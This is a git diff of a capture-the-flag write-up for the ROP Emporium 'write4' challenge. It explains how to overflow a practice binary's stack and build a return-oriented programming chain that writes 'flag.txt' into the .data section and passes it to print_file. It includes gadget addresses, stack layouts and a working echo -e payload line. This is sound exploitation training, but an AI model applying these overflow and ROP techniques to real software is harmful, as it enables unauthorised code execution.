@@ -1,3 +1,13 @@
+# GIST
+The goal of this exercise is to create a slightly more advanced ROP chain, using ROP gadgets to inject data into memory using the stack, and then pass those values as arguments into a function call.
+
+# Link
+Read about it [here](https://ropemporium.com/challenge/write4.html)
+
+
+
+
+# Identifying and Analyzing Functions
 First, let's look at functions imported from shared libraries:
 
 	rabin2 -i write432
@@ -51,8 +61,6 @@ With this, we have identified another function called usefulGadgets :)
 	[*] Stopped process '/home/ubuntu/ropemporium/write4/write432' (pid 19958)
 
 
-
-
 	
 So, looks like pwnme function is *imported* this time, from the libwrite432.so library.
 This means "pwnme" won't be at a static place in memory, as it is dynamically loaded into a random address each time the program is ran... We can confirm this with ldd:
@@ -95,12 +103,13 @@ This function tries to open file by name, but "nonexistent" is passed as an argu
 	Failed to open file: nonexistent
 	[Inferior 1 (process 18808) exited with code 01]
 
+# Writing to Memory
+
 So, we know that we want to use ROP to change the arguments that are on the stack when the "print_file" function is called. With the previous challenges we were able to leverage "usefulString" to open the file that we wanted, but in this case, there is no "usefulString" in memory... :'(
 
 We need to write a string to memory.
 We need to use a ROPgadget to do this.
 
-#### Note
 This article is a pretty good reference if you're following along: [ROP FTW](https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf)
 
 After a bit of reading, looks like we should look at what sections are writeable...
@@ -137,6 +146,8 @@ We can also do this using mmap in gdb:
 	
 So we have 8 Bytes of data that we can write to in the .data section, which starts at 0x0804a018 and ends at 0x0804a01c.
 Flag.txt is 8 Bytes, so we shouldddd be able to fit that into the data section.
+
+# Choosing Gadgets 
 
 Okay, let's look at some of the ROP gadgets...
 These are some of the relevant gadgets: 
@@ -188,12 +199,14 @@ We can do this by popping a value off of the stack, and into edi:)
 
 	0x080485aa : pop edi ; pop ebp ; ret
 
-With both of these ROP gadgets, we can set up the stack so that we can pop a value into edi, and a value into ebp. We can then return the next ROP gadget (usefulGadgets), which will move the value of ebp into the address that edi points to. In other words:
+With both of these ROP gadgets, we can set up the stack so that we can pop a value into edi, and a value into ebp. We can then return the next ROP gadget (usefulGadgets), which will move the value of ebp into the address that edi points to. In other words (speaketh C?):
 
-edi = \< address in data section \>
-ebp = "flag"
-\*edi = ebp = "flag"
+	edi = <address in data section>
+	ebp = "flag"
+	*edi = ebp = "flag"
 
+
+# Stack 1
 
 So let's set up the stack accordingly:
 
@@ -202,7 +215,9 @@ So let's set up the stack accordingly:
 	fake ebp
 	 = BBBB                                  4B
 	_______________________________________
-	&ROP gadget
+	eip  
+ 	 = address of ROP gadget
+	 = &ROP gadget ("&" = "address of")	
 	 = 0x080485aa
 	 = "\xaa\x85\x04\x08"
 	_______________________________________
@@ -223,8 +238,14 @@ So let's set up the stack accordingly:
 	 = cccc 
 	_______________________________________
 	
-Let's give it a go:
-(I set this up in a .txt file using "echo -e"... This helps me have more granular control over the values that I am passing into the program. Also, I am a n00b)
+I set this up in a .txt file using "echo -e"... This helps me have more granular control over the values that I am passing into the program. Also, I am a n00b.
+
+Me using echo -e:
+
+	$ echo -e "`python3 -c "print('a'*40+'b'*4)"`\xaa\x85\x04\x08\x18\xa0\x04\x08galf\x43\x85\x04\x08cccc" > input
+
+
+Let's run it in gdb and see if our values are correct:
 
 	gef➤  i r edi
 	edi            0x804a018           0x804a018
@@ -236,6 +257,9 @@ Let's give it a go:
 
 Okay, so this worked pretty nicely :) we now have "flag" stored at .data (0x0804a018)
 
+
+# Stack 2 - Storing the Entire String in Memory
+
 Now, we need to get "txt." into .data+0x4 (0x0804a01c)
 Can we use the same ROP gadgets??
 
@@ -245,7 +269,7 @@ Can we use the same ROP gadgets??
 	 = BBBB                                  4B
 	_______________________________________
 	eip
-	&ROP gadget
+	 = &ROP gadget
 	 = 0x080485aa				 4B 
  	 = "\xaa\x85\x04\x08"
 	 _______________________________________
@@ -262,7 +286,7 @@ Can we use the same ROP gadgets??
 	 = 0x08048543 				 4B
 	 = "\x43\x85\x04\x08"
 	________________________________________
-	&ROP gadget
+	 eip = &ROP gadget
 	 = 0x080485aa				 4B
 	 = "\xaa\x85\x04\x08"
 	_______________________________________
@@ -295,6 +319,9 @@ Looks like we can :D.
 	
 Okay, so we succesfully have put ".txt" at .data+0x4 (edi register) :)
 
+
+# Passing Arguments to Our Function
+
 We now have put our string in memory! It is located at &data_start, or in other words, the start of the .data section header in our program :)
 So, now we set up the stack so that it has those addresses on it, which will be arguments passed into the print_file function:
 
@@ -305,7 +332,7 @@ So, now we set up the stack so that it has those addresses on it, which will be 
 	 = BBBB                                  4B
 	_______________________________________
 	eip
-	&ROP gadget
+	 = &ROP gadget
 	 = 0x080485aa				 4B
 	 = "\xaa\x85\x04\x08"
 	_______________________________________
@@ -316,7 +343,7 @@ So, now we set up the stack so that it has those addresses on it, which will be 
 	_______________________________________
 	ebp 
 	 = "flag"				 4B
-	 = "galf"
+	 = "galf" (gotta love endian-ness)
 	_______________________________________
 	eip = &usefulGadget
 	 = 0x08048543 				 4B
@@ -353,6 +380,8 @@ So, now we set up the stack so that it has those addresses on it, which will be 
 	 = "\x18\xa0\x04\x08"
 	_______________________________________
 	
+
+# FTW
 
 O hek yea
 
